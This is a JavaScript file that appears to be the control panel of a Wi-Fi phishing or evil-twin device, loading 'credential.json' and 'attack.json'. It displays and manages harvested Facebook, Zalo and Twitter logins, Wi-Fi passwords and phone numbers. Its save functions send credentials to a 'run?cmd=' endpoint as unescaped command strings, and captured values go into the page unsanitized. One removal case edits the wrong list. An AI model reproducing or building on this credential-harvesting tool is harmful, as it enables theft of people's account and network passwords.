// var credentialJson = {};

// function load() {
//     getFile("wifissid.json", function (res) {
//         document.getElementById("ssid").innerHTML = res;
//     });
// }

var credentialJson = {};

loadLang();
function load() {
    
    getFile("credential.json", function (res) {
        credentialJson = JSON.parse(res);
        draw();
    });

    getFile("attack.json", function (response) {
        attackJSON = JSON.parse(response);
        draw();
    });

    getFile("wifissid.json", function (res) {
        document.getElementById("ssid").innerHTML = res;
    });

}

function draw() {
    var htmlFb = "";
    htmlFb = "<tr>" +
        "<th class='id'>id</th>" +
        "<th class='username'>username</th>" +
        "<th class='password'>password</th>" +
        "</tr>";

    var htmlPhone = "";
    htmlPhone = "<tr>" +
        "<th class='id'>id</th>" +
        "<th class='name'>name</th>" +
        "<th class='phonenumber'>phone number</th>" +
        "</tr>";

    var zalohtml = "";
    zalohtml = "<tr>" +
        "<th class='id'>id</th>" +
        "<th class='username'>username</th>" +
        "<th class='password'>password</th>" +
        "</tr>";

    var twitterhtml = "";
    twitterhtml = "<tr>" +
        "<th class='id'>id</th>" +
        "<th class='username'>username</th>" +
        "<th class='password'>password</th>" +
        "</tr>";

    var wifihtml = "";
    wifihtml = "<tr>" +
        "<th class='id'>id</th>" +
        "<th class='username'>SSID</th>" +
        "<th class='password'>password</th>" +
        "</tr>";

    for (var key in credentialJson) {
        if (credentialJson.hasOwnProperty(key)) {
            if (key === "facebook") {
                var facebook = credentialJson[key];
                for (var i in facebook)
                    htmlFb += "<tr>" +
                        "<td class='id'>" + i + "</td>" +
                        "<td class='name'>" + facebook[i][0] + "</td>" +
                        "<td class='phone'>" + facebook[i][1] + "</td>" +
                        "<td class='remove'><button class='red' onclick='remove(1," + i + ")'>X</button></td>" +
                        "</tr>";
            } else if (key == "phone") {
                var phone = credentialJson[key];
                for (var i in phone)
                    htmlPhone += "<tr>" +
                        "<td class='id'>" + i + "</td>" +
                        "<td class='name'>" + phone[i][0] + "</td>" +
                        "<td class='phone'>" + phone[i][1] + "</td>" +
                        "<td class='remove'><button class='red' onclick='remove(0," + i + ")'>X</button></td>" +
                        "</tr>";
            } else if (key == "twitter") {
                var twitter = credentialJson[key];
                for (var i in twitter)
                    twitterhtml += "<tr>" +
                        "<td class='id'>" + i + "</td>" +
                        "<td class='name'>" + twitter[i][0] + "</td>" +
                        "<td class='phone'>" + twitter[i][1] + "</td>" +
                        "<td class='remove'><button class='red' onclick='remove(4," + i + ")'>X</button></td>" +
                        "</tr>";
            } else if (key == "wifi") {
                var wifi = credentialJson[key];
                for (var i in wifi)
                    wifihtml += "<tr>" +
                        "<td class='id'>" + i + "</td>" +
                        "<td class='name'>" + wifi[i][0] + "</td>" +
                        "<td class='phone'>" + wifi[i][1] + "</td>" +
                        "<td class='remove'><button class='red' onclick='remove(5," + i + ")'>X</button></td>" +
                        "</tr>";
            } else {
                var zalo = credentialJson[key];
                for (var i in zalo)
                    zalohtml += "<tr>" +
                        "<td class='id'>" + i + "</td>" +
                        "<td class='name'>" + zalo[i][0] + "</td>" +
                        "<td class='phone'>" + zalo[i][1] + "</td>" +
                        "<td class='remove'><button class='red' onclick='remove(3," + i + ")'>X</button></td>" +
                        "</tr>";
            }
        }
    }

    document.getElementById("fbTable").innerHTML = htmlFb;
    document.getElementById("phoneTable").innerHTML = htmlPhone;
    document.getElementById("zaloTable").innerHTML = zalohtml;
    document.getElementById("twitterTable").innerHTML = twitterhtml;
    document.getElementById("wifiTable").innerHTML = wifihtml;
}

function saveFacebook() {
    var usename = getE("username").value;
    var password = getE("password").value;
    const isPhone = /^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/;
    var reg = new RegExp('([A-Za-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3})$');
    if (isPhone.test(usename) || reg.test(usename)) {
        getFile("run?cmd=savefb" + " \"" + usename + "\"" + " \"" + password + "\"");
        // var system_busy = lang("system_busy");
        alert(lang("system_busy"));
    } else {
        alert(lang("facebook_invalid"));
    }
}

function saveTwitter() {
    var usename = getE("twitter_user").value;
    var password = getE("twitter_pass").value;
    const isPhone = /^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/;
    var reg = new RegExp('([A-Za-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3})$');
    if (isPhone.test(usename) || reg.test(usename)) {
        getFile("run?cmd=savetwitter" + " \"" + usename + "\"" + " \"" + password + "\"");
        alert(lang("system_busy"));
    } else {
        alert(lang("twitter_invalid"));
    }
}

function saveZalo() {
    var usename = getE("zlusername").value;
    var password = getE("zlpassword").value;
    const isPhone = /^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/;
    var reg = new RegExp('([A-Za-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3})$');
    if (isPhone.test(usename) || reg.test(usename)) {
        getFile("run?cmd=savezalo" + " \"" + usename + "\"" + " \"" + password + "\"");
        alert(lang("system_busy"));
    } else {
        alert(lang("phone_invalid"));
    }
}

function savePhone() {
     
    var name = getE("name").value;
    var number = getE("phonenumber").value;
    const isPhone = /^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/;

    if (isPhone.test(number)) {
        getFile("run?cmd=savephone" + " \"" + name + "\"" + " \"" + number + "\"");
        alert(lang("system_busy"));
    } else {
        alert(lang("phone_invalid"));
    }
}

function saveWifi() {
    var name = document.getElementById("ssid").innerHTML;
    var pass = getE("passwifi").value;
    if (pass < 8) {
        alert(lang("password_error"));
    } else {
        getFile("run?cmd=savewifi" + " \"" + name + "\"" + " \"" + pass + "\"");
        alert(lang("system_busy"));
    }
}

function remove(type, id) {
    switch (type) {
        case 0:
            credentialJson.phone.splice(id, 1);
            draw();
            getFile("run?cmd=credentialdelete phone " + id);
            break;
        case 1:
            credentialJson.facebook.splice(id, 1);
            draw();
            getFile("run?cmd=credentialdelete facebook " + id);
            break;
        case 2:
            // credentialJson.facebook.splice(id, 1);
            draw();
            getFile("run?cmd=credentialdelete all");
            break;
        case 3:
            credentialJson.zalo.splice(id, 1);
            draw();
            getFile("run?cmd=credentialdelete zalo " + id);
            break;
        case 4:
            credentialJson.twitter.splice(id, 1);
            draw();
            getFile("run?cmd=credentialdelete twitter " + id);
            break;
        case 5:
            credentialJson.twitter.splice(id, 1);
            draw();
            getFile("run?cmd=credentialdelete wifi " + id);
            break;
    }
}